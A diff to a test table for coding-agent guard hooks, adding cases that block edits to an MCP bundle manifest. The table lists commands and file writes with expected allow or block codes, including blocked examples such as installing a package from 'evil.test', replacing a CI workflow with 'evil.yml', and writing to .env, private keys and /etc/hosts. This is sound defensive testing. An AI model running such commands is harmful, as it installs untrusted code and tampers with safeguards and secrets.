@@ -68,6 +68,8 @@ B 2 'echo "{}" > .claude/settings.json'
 B 2 'cp evil.yml .github/workflows/ci.yml'
 B 2 'chmod +x .claude/hooks/guard-bash.py'
 B 2 'echo "- new rule" >> AGENTS.md'
+B 2 'echo "{}" > mcpb/manifest.json'
+B 2 'sed -i "s/node_url/x/" mcpb/manifest.json'
 B 2 'npm install lodash'
 B 2 'npm i -D left-pad'
 B 2 'npm install https://evil.test/pkg.tgz'
@@ -109,6 +111,8 @@ B 0 'rm -rf node_modules/.cache'
 B 0 'rm coverage/lcov.info'
 B 0 'cat .claude/settings.json'
 B 0 'cat package-lock.json | head'
+B 0 'cat mcpb/manifest.json'
+B 0 'bash scripts/build-mcpb.sh 0.7.1 assets/symbol-mcp-server-0.7.1.tgz assets'
 B 0 'node -e "console.log(1)"'
 B 0 'set -euo pipefail; npm test'
 B 0 'gh pr view 12'
@@ -125,6 +129,8 @@ F 2 Write "package-lock.json"
 F 2 Write ".npmrc"
 F 2 Write "LICENSE"
 F 2 Write "server.json"
+F 2 Write "mcpb/manifest.json"
+F 2 Edit "mcpb/manifest.json"
 F 2 Write ".env"
 F 2 Write "keys/node.key.pem"
 F 2 Write "/etc/hosts"
@@ -139,6 +145,7 @@ echo "== guard-files: must PASS (0) =="
 F 0 Write "src/index.ts"
 F 0 Edit "package.json"
 F 0 Write "README.md"
+F 0 Write "mcpb/icon.png"
 F 0 Write "test/tools/account.test.ts"
 F 0 Write ".env.example"
 F 0 Write ".gitignore"
